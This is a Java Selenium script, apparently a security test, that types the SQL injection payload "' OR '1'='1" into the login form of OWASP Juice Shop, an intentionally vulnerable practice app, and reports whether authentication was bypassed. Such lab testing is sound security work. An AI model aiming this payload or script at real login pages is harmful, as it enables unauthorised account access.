package com.example;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import io.github.bonigarcia.wdm.WebDriverManager;
import java.time.Duration;

public class Loginautomationtest {

    public static void main(String[] args) {
    	
        // Setup ChromeDriver using WebDriverManager
        WebDriverManager.chromedriver().setup();

        // Initialize ChromeDriver
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--remote-allow-origins=*");
        WebDriver driver = new ChromeDriver(options);

        try {
            driver.manage().window().maximize();
            
            // Navigate to the local OWASP Juice Shop login page
            driver.get("https://juice-shop.herokuapp.com/#/login");
            
            // Store the current URL (before login)
            String loginPageURL = driver.getCurrentUrl();

            // Wait until the username and password input fields are present
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(20));
            WebElement usernameField = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("email")));
            WebElement passwordField = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("password")));
            
            // Wait until the login button is clickable
            WebElement loginButton = wait.until(ExpectedConditions.elementToBeClickable(By.id("loginButton")));

            // Ensure fields are displayed and enabled
            if (usernameField.isDisplayed() && usernameField.isEnabled()) {
                System.out.println("Username field is displayed and enabled.");
            }
            if (passwordField.isDisplayed() && passwordField.isEnabled()) {
                System.out.println("Password field is displayed and enabled.");
            }
            if (loginButton.isDisplayed() && loginButton.isEnabled()) {
                System.out.println("Login button is displayed and enabled.");
            }

            // Craft SQL Injection payload
            String sqlInjectionPayload = "' OR '1'='1";

            // Enter the SQL Injection payload and a valid password
            usernameField.sendKeys(sqlInjectionPayload);
            passwordField.sendKeys("12345"); // Use any valid password

            // Submit the form
            loginButton.click();

            // Wait for a short period to allow for login processing and page load
            Thread.sleep(3000); // You can adjust the duration if needed

            // Check if the URL has changed, indicating a successful login
            String currentURL = driver.getCurrentUrl();
            if (!currentURL.equals(loginPageURL)) {
                System.out.println("SQL Injection payload successful, login bypassed.");
            } else {
                // Check for the presence of an error message if the URL hasn't changed
                try {
                    WebElement errorMessage = wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector(".error")));
                    if (errorMessage.isDisplayed()) {
                        System.out.println("SQL Injection attempt detected: " + errorMessage.getText());
                    }
                } catch (Exception e) {
                    System.out.println("SQL Injection attempt did not produce an error message.");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Clean up and close the browser
            driver.quit();
        }
    }
}
